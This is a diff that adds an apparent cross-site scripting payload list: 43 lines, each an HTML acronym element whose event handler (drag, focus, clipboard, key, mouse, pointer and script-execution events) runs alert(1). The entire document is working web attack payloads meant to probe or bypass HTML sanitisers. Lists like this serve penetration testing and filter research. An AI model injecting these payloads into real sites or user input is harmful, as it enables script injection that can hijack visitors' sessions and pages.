@@ -1,0 +1,43 @@
+<acronym draggable="true" ondrag="alert(1)">test</acronym>
+<acronym draggable="true" ondragend="alert(1)">test</acronym>
+<acronym draggable="true" ondragenter="alert(1)">test</acronym>
+<acronym draggable="true" ondragleave="alert(1)">test</acronym>
+<acronym draggable="true" ondragstart="alert(1)">test</acronym>
+<acronym id=x tabindex=1 onactivate=alert(1)></acronym>
+<acronym id=x tabindex=1 onbeforeactivate=alert(1)></acronym>
+<acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>
+<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>
+<acronym id=x tabindex=1 onfocus=alert(1)></acronym>
+<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>
+<acronym onafterscriptexecute=alert(1)><script>1</script>
+<acronym onbeforecopy="alert(1)" contenteditable>test</acronym>
+<acronym onbeforecut="alert(1)" contenteditable>test</acronym>
+<acronym onbeforepaste="alert(1)" contenteditable>test</acronym>
+<acronym onbeforescriptexecute=alert(1)><script>1</script>
+<acronym onblur=alert(1) tabindex=1 id=x></acronym><input autofocus>
+<acronym onclick="alert(1)">test</acronym>
+<acronym oncontextmenu="alert(1)">test</acronym>
+<acronym oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<acronym oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<acronym ondblclick="alert(1)" autofocus tabindex=1>test</acronym>
+<acronym onfocusout=alert(1) tabindex=1 id=x></acronym><input autofocus>
+<acronym onkeydown="alert(1)" contenteditable>test</acronym>
+<acronym onkeypress="alert(1)" contenteditable>test</acronym>
+<acronym onkeyup="alert(1)" contenteditable>test</acronym>
+<acronym onmousedown="alert(1)">test</acronym>
+<acronym onmouseenter="alert(1)">test</acronym>
+<acronym onmouseleave="alert(1)">test</acronym>
+<acronym onmousemove="alert(1)">test</acronym>
+<acronym onmouseout="alert(1)">test</acronym>
+<acronym onmouseover="alert(1)">test</acronym>
+<acronym onmouseup="alert(1)">test</acronym>
+<acronym onmousewheel=alert(1)>requires scrolling
+<acronym onpaste="alert(1)" contenteditable>test</acronym>
+<acronym onpointerdown=alert(1)>XSS</acronym>
+<acronym onpointerenter=alert(1)>XSS</acronym>
+<acronym onpointerleave=alert(1)>XSS</acronym>
+<acronym onpointermove=alert(1)>XSS</acronym>
+<acronym onpointerout=alert(1)>XSS</acronym>
+<acronym onpointerover=alert(1)>XSS</acronym>
+<acronym onpointerrawupdate=alert(1)>XSS</acronym>
+<acronym onpointerup=alert(1)>XSS</acronym>
